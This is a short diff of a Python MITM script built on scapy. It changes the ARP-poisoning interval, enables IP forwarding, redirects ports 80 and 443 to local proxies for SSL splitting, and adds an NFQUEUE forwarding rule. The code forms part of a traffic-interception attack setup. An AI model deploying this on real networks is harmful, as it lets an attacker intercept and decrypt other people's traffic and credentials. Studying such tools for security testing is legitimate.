@@ -3,18 +3,21 @@ import subprocess, re, fcntl
 from scapy.all import *
 
 DEBUG = False
-#poisoning interval
-interval = 2
+#poisoning interval (sec)
+interval = 5 
 
 def enable_port_forwarding():
     #enable ip forwarding
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    iptables_init()
+    reset_iptable()
     os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
     os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
 
+def nfq_ip_rule():
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
 
 def disable_port_forwarding():
+    reset_iptable()
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 
@@ -26,7 +29,7 @@ def sslsplit():
         stdout=subprocess.PIPE,
         shell=True)
 
-def iptables_init():
+def reset_iptable():
     """flush iptables"""
     os.system("iptables -F")
     os.system("iptables -t nat -F")
